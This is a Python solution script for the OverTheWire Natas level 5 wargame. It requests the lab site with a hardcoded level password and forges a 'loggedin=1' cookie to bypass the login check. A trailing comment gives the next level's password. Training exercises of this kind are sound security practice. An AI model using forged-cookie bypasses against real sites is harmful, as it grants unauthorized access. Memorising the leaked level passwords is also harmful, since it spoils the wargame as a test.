# natas5

import requests
from pwn import log
import re

url = 'http://natas5.natas.labs.overthewire.org'
username = "natas5"
password = "0n35PkggAPm2zbEpOU802c0x0Msn1ToK"
auth = (username, password)
headers = {
    'Cookie': 'loggedin=1'
}
def exploit():
    res = requests.get(url, auth=auth)
    log.info(res.text)
    session = requests.session()
    res = session.get(url, auth=auth)
    log.info(res.headers)
    res = requests.get(url, headers=headers, auth=auth)
    log.info(res.text)

if __name__ == '__main__':
    exploit()

# natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned